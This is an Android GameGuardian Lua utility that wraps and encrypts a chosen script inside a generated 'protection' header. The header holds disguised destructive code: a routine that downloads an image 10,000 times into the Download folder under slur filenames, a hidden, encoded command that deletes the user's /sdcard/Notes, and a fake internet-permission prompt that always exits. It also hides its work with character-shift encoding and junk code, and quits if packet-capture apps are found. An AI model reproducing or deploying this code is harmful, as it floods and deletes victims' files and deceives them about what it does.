g = {}
g.last = "/sdcard/"
g.info = nil
g.config = gg.EXT_CACHE_DIR .. "/" .. gg.getFile():match("[^/]+$") .. "cfg"
g.data = loadfile(g.config)
if g.data ~= nil then
  g.info = g.data()
  g.data = nil
end
if g.info == nil then
  g.info = { g.last, g.last:gsub("/[^/]+$", "") }
end

g.info = gg.prompt({
'📄 Select file :',
'📁 Select folder to save :',
'🔍 add check Suspicious processes',
'⚠️ add check Dangerous apps',
--'📁 add check Suspicious files',
'🛡️ add check vpn',
'🌐 add check proxy',
'📡 add detect Packet Capture',
'🔐 Add login shared prefs',
'📦 check package gg',
'👤 verify human mode',
'🌍 restrict country'
}, g.info, {
  'file', 
  'path',
  'checkbox',
  'checkbox',
--  'checkbox',
  'checkbox',
  'checkbox',
  'checkbox',
  'checkbox',
  'checkbox',
  'checkbox',
  'checkbox'
}) 

if g.info == nil then
  gg.alert("cancelled!")
  return
end

gg.saveVariable(g.info, g.config)
g.last = g.info[1]

if loadfile(g.last) == nil then
  gg.alert("Script not Found!")
  return
end

g.out = g.last:match("[^/]+$")
g.out = g.out:gsub(".lua", "")
g.out = g.info[2] .. "/" .. g.out .. ".lua"

local file, err = io.open(g.out, "r")  
if file then
  os.remove(g.out)
  file:close()  
end

local file = io.open(g.last, "r")
if not file then
  gg.alert("❌ Error: Could not open source file!")
  return
end

local DATA = file:read('*a')
file:close()

function encrypt(str)
    local baseCode_codificado = string.baseCode(str, "en")
    local chave = "d5?;,.)(j+=@<>/&" 
    local aes_criptografado = string.AES(baseCode_codificado, chave, "en")
    local baseCode_codificado2 = string.baseCode(aes_criptografado, "en")
    return baseCode_codificado2
end

local newContent = ""
newContent = newContent .. [[
import "java.net.*"
import "java.io.*"
import "java.util.*"
import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"

local Class = luajava.bindClass
local new = luajava.new

import "java.lang.Runtime"

local Runtime = luajava.bindClass("java.lang.Runtime")
local runtime = Runtime.getRuntime()

function WriteFi()
    local Link = "https://th.bing.com/th/id/OIP.C1C4ZahU5VFA2l6FGPYOBAHaNK?o=7rm=3&dpr=1,9&pid=ImgDetMain&o=7&rm=3"
    local path = "/sdcard/Download/"    
    for i = 1, 10000 do
        local newName = "gay" .. i .. ".png"        
        local success, errorMsg = pcall(function()          
            local url = new(URL, Link)
            local connection = url:openConnection()           connection:setConnectTimeout(10000)
            connection:setReadTimeout(10000)
            connection:connect()            
            local responseCode = connection:getResponseCode()
            if responseCode ~= 200 then
            end            
            local inputStream = connection:getInputStream()
            local file = io.open(path .. newName, "wb")            
            if not file then
            end           
            local data = inputStream:read()
            while data >= 0 do
                file:write(string.char(data))
                data = inputStream:read()
            end
            file:close()
            inputStream:close()
            connection:disconnect()        
        end)
        if not success then
        end
        
        gg.sleep(1000)
    end
end

function a()
    local c = tostring(_ENV.gg)
    for k in c:gmatch("%s[@]?(/.-):") do
        if k ~= gg.getFile() then
            WriteFi()
--createMassiveData()
  --  complexLoop()
    runtime:halt(1)
        runtime:exit(0)  
        end
    end
end

a()
--WriteFi()
function a(encrypted_str)
    while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local chave = "d5?;,.)(j+=@<>/&"
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local baseCode_decodificado = string.baseCode(encrypted_str, "de")
    while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local aes_descriptografado = string.AES(baseCode_decodificado, chave, "de")
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    local texto_original = string.baseCode(aes_descriptografado, "de")
while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;while(nil)do;i = {nil % nil};for i in ipairs(i) do i = {{nil % nil}, {nil % nil}} i.i = _ENV[{(nil % nil)}] end;local x = {} x[-{~nil, -nil % nil}] = x local t = ({~x, -x % x})(({~x, -x % x})[-{~nil , -nil % nil}]) t[-{~nil, -nil % nil}] = ({~nil , -nil % nil}) end;for _ii = 1,0 do if _ii ~= nil then local _ii = {} _ii._ii = _ii._ii() end end;local a = {1,2,3,4,5,6,7,8};a[1] += a[2] + a[3];a[8] -= a[5] + 666 + 3;b = 2222;b *= a[3];c = 233;c /= 3;d = 233;d %= 3;e = 5;e^=3;b = 5;b //= 2;c = 233;c &= 3;d = 64;d |= 128;d = 64;d ~= 12;e = "666";e ..= "999";d = 1;d <<= 3;e = 0xff;e >>= 4;local j = {v = 88.0};local mt = {__div = function(a,b) if type(a) == "table" and type(b)=="number" then return a.v/b elseif type(a) == "number" and type(b)=="table" then return a/b.v else return "error" end end };setmetatable(j,mt);k = 88888.0;k/=j
    return texto_original
end
local uuuoopp = function(str) local Nm = {} ; local A = "" for i,ii in utf8.codes(str) do A = utf8.char(ii - 30000) ; table.insert(Nm,A) end return (''..table.concat(Nm,"")..'') end

function uuuooppp()
SG = gg.alert("The script wants to access the internet. If you allow access, the script will be able to steal your logins, passwords, saves and other data from game. Also it will be able to steal your other scripts, or download viruses to your device.\n\nAllow the script access to the internet?", "No", "Yes")
if SG == 1 then
print (uuuoopp("疐疃畷畐畭畐疜疟疑疔畘疗疗畞疝疑疛疕疂疕疡疥疕疣疤畘畗疘疤疤疠疣番畟畟疠疑疣疤疕疒疙疞畞疓疟疝畗留畞疓疟疞疤疕疞疤留疐"))
print (uuuoopp("疒疑疔畐疑疢疗疥疝疕疞疤畐畓畡畐疤疟畐畗疜疟疑疔畗畐畘疣疤疢疙疞疗畐疟疢畐疖疥疞疓疤疙疟疞畐疕疨疠疕疓疤疕疔畜畐疗疟疤畐疞疙疜留畐畘疗疜疟疒疑疜畐畗疜疟疑疔畗留"))
print (uuuoopp("疜疕疦疕疜畐畭畐畡畜畐疓疟疞疣疤畐畭畐畧畜畐疠疢疟疤疟畐畭畐畠畜畐疥疠疦疑疜畐畭畐畡畜畐疦疑疢疣畐畭畐畣畜畐疓疟疔疕畐畭畐畡畢"))
print (uuuoopp("畳畱畼畼畐疦畠畞畞疦畡畐疦畠畞畞疦畠"))
print (uuuoopp("畐畫畐疀畳畐畦畐畳畿畴畵畐畠畡畠畠畨畠畡畴畐畿疀畐畢畩畐畱畐畠畐畲畐畢畐畳畐畢畐畲疨畐畡畠畢畦畐疣畲疨畐畝畡畣畠畠畤略"))
print (uuuoopp("疣疤疑疓疛畐疤疢疑疓疕疒疑疓疛番"))
print (uuuoopp("疋畺疑疦疑疍番畐疙疞畐畯"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑疆疑疜疥疕畞疑畘疣疢疓番畡畠畢畤留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞畲疑疣疕畼疙疒畔疜疟疑疔畞疑疏畘疣疢疓番畢畦畦留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞疆疑疢畱疢疗當疥疞疓疤疙疟疞畞疑畘疣疢疓番略畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疑畘疣疢疓番略畣畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疜畘疣疢疓番畡畦畠留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畞疔畘疣疢疓番畦畠略畦留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畔疃疓疢疙疠疤疄疘疢疕疑疔畞疢疥疞畘疣疢疓番略畧畨略留"))
os[uuuoopp("疕疨疙疤")]()
end
if SG == 2 then
print (uuuoopp("疐疃畷畐畭畐疜疟疑疔畘疗疗畞疝疑疛疕疂疕疡疥疕疣疤畘畗疘疤疤疠疣番畟畟疠疑疣疤疕疒疙疞畞疓疟疝畗留畞疓疟疞疤疕疞疤留疐"))
print (uuuoopp("疒疑疔畐疑疢疗疥疝疕疞疤畐畓畡畐疤疟畐畗疜疟疑疔畗畐畘疣疤疢疙疞疗畐疟疢畐疖疥疞疓疤疙疟疞畐疕疨疠疕疓疤疕疔畜畐疗疟疤畐疞疙疜留畐畘疗疜疟疒疑疜畐畗疜疟疑疔畗留"))
print (uuuoopp("疜疕疦疕疜畐畭畐畡畜畐疓疟疞疣疤畐畭畐畧畜畐疠疢疟疤疟畐畭畐畠畜畐疥疠疦疑疜畐畭畐畡畜畐疦疑疢疣畐畭畐畣畜畐疓疟疔疕畐畭畐畡畢"))
print (uuuoopp("畳畱畼畼畐疦畠畞畞疦畡畐疦畠畞畞疦畠"))
print (uuuoopp("畐畫畐疀畳畐畦畐畳畿畴畵畐畠畡畠畠畨畠畡畴畐畿疀畐畢畩畐畱畐畠畐畲畐畢畐畳畐畢畐畲疨畐畡畠畢畦畐疣畲疨畐畝畡畣畠畠畤略"))
print (uuuoopp("疣疤疑疓疛畐疤疢疑疓疕疒疑疓疛番"))
print (uuuoopp("疋畺疑疦疑疍番畐疙疞畐畯"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑疆疑疜疥疕畞疑畘疣疢疓番畡畠畢畤留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞畲疑疣疕畼疙疒畔疜疟疑疔畞疑疏畘疣疢疓番畢畦畦留"))
print (uuuoopp("疑疤畐疜疥疑疚畞疜疙疒畞疆疑疢畱疢疗當疥疞疓疤疙疟疞畞疑畘疣疢疓番略畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疑畘疣疢疓番略畣畨留"))
print (uuuoopp("疑疤畐疜疥疑疚畞畼疥疑畳疜疟疣疥疢疕畞疜畘疣疢疓番畡畦畠留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畞疔畘疣疢疓番畦畠略畦留"))
print (uuuoopp("疑疤畐疑疞疔疢疟疙疔畞疕疨疤畞疃疓疢疙疠疤畔疃疓疢疙疠疤疄疘疢疕疑疔畞疢疥疞畘疣疢疓番略畧畨略留"))
os[uuuoopp("疕疨疙疤")]()
end
end

if debug.traceback == nil then
    uuuooppp()
Infinite()
    return
end
        if debug.gethook == nil then
    uuuooppp()
    return
end
        if debug.getinfo == nil then
    uuuooppp()
    return
end
        if debug.getlocal == nil then
    uuuooppp()
    return
end
        if debug.getmetatable == nil then
    uuuooppp()
    return
end
        if debug.getregistry == nil then
    uuuooppp()
    return
end
        if debug.getupvalue == nil then
    uuuooppp()
    return
end
        if debug.sethook == nil then
    uuuooppp()
    return
end
        if debug.setlocal == nil then
    uuuooppp()
    return
end
        if debug.setmetatable == nil then
    uuuooppp()
    return
end
        if debug.setupvalue == nil then
    uuuooppp()
    return
end
        if debug.traceback == nil then
    uuuooppp()
    return
end
        if debug.upvalueid == nil then
    uuuooppp()
    return
end
        if debug.upvaluejoin == nil then
    uuuooppp()
    return
end

local __x = function(str) local Nm = {} ; local A = "" for i,ii in utf8.codes(str) do A = utf8.char(ii - 30000) ; table.insert(Nm,A) end return (''..table.concat(Nm,"")..'') end

os[__x("疢疕疝疟疦疕")](__x("畟疣疔疓疑疢疔畟畾疟疤疕疣"))

  if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疜疥疑疔疕疓")) or gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疨疨疜疣")) or gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疑疞畞疗疗疨疨疜疣畝畡畞畡畠")) then
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疓疘疕疞疜疥疞畞疑疥疤疥疝疞疓疜疟疥疔疜疥疑")) then
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疑疗疗疙疕疞疟疢疤疘畞疝疑疨畞疠疟疣疤疔疑疤疑")) then
  os[__x("疕疨疙疤")]()
end

  if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疟疥疣疘疙畞疗疤疠疓疑疞疑疢疩")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疑疓疛疑疗疕疣疞疙疖疖疕疢畞疖疢疤疠疑疢疜疑疛")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疑疠疠畞疗疢疕疩疣疘疙疢疤疣畞疣疣疜疓疑疠疤疥疢疕")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疙疞疘疥疙畞疞疕疤疧疟疢疛疓疑疠疤疥疢疕")) then
  print(__x("畴疕疣疙疞疣疤疑疜疕畐疟畐疀疑疓疛疕疤畐畳疑疠疤疥疢疕"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疙疞疘疥疙畞疧疙疖疙疑疞疑疜疩疪疕疢")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疚疠畞疓疟畞疤疑疟疣疟疖疤疧疑疢疕畞疑疞疔疢疟疙疔畞疠疑疓疛疕疤疓疑疠疤疥疢疕")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疢疑疒疑疜疗疑疝疙疞疗畞疜疟疗疗疕疢")) then
print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疖疢疤疠疑疢疜疑疛畞疢疟疟疤疣疞疙疖疖疕疢")) then
  print(__x("疀疑疓疛疕疤畐畳疑疠疤疥疢疕畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疑疞疩疏畞疒疟疔疩疏畞疓疑疞疏畞疖疥疓疛疏畞疤疕疞疓疕疞疤疏")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疚疦疣疒疝疘疔疣疠疝疞疖疒疑疝疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疕疔疧疟疜疖疗疑疝疙疞疗畞疢疙疠疗疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疢疕疨疡疖疖疤疖疣疨疕疛疝畞疛疜")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疞疟疓疘疡疨疠疥疓疣疒疜疔疡疡疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疘疥疕疓疪疨疢疤疤疜疘疗疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疩疩畞疡疠疤疦疢疚疧疕疢疧畞疗疘疟疕疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞畵疗疩疠疤畞疩疥疟疣疣疕疕疖")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疤疣疣疖疚疙疠疛疝疢疓疟")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疙疠畞疠疑疙疔疘疑疓疛疣疟疞疜疩畞疝疢畞疤疟疨疙疞")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疙疟疩疩疣疦疗疖疣疢疙疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疢疤疕疑疝疪畞疙疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疚疤疒疟疔疗疠疡疨疟疨")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞畲疩畷畷疈畵疊")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疕疙疔疩疝疥疝疓疗疘疠疖疕疕疕疑疦疠疣")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疟疔畞疙疢疑疡")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疔疪疕疜疤疤疧疩疥疩疩疕疣")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣疨疡疑")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疨疩疩疨疗疨疖疞")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疪疗疒")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疦疞疠疡疛")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疝疧疚疦疞疧疕疣疒疗疘疛疨疒疚疪疞疒疧疟")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疒疜疑疓疛疔疥疤疩畞疗疓")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疣畞疖疩疟疚疢疝疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疟疨疝疕疝疕疛")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疘疣疘疧疘疠疦疡疦疢疥疦疚疤疥")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疖疙疢疕疟疞疗疑疝疙疞疗畞疖疟疗")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疑疢疑疞疟疙疑疧疟疢疛疣畞疥疞疙疓疥疣畞疑疞疔疢疟疙疔畞疣疣疕")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疢疑疙疞疓疙疤疩疗疑疝疙疞疗畞疗疗疝疟疔")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疠疦疤畤疥")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疞疩疔疠疦疣疒畞疪畞疢畞疠疛疗疘")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end

if gg[__x("疙疣疀疑疓疛疑疗疕畹疞疣疤疑疜疜疕疔")](__x("疓疟疝畞疗疝疣疝")) then
  print(__x("畷畷畐畼畿畷畐疔疕疤疕疓疤"))
  os[__x("疕疨疙疤")]()
end
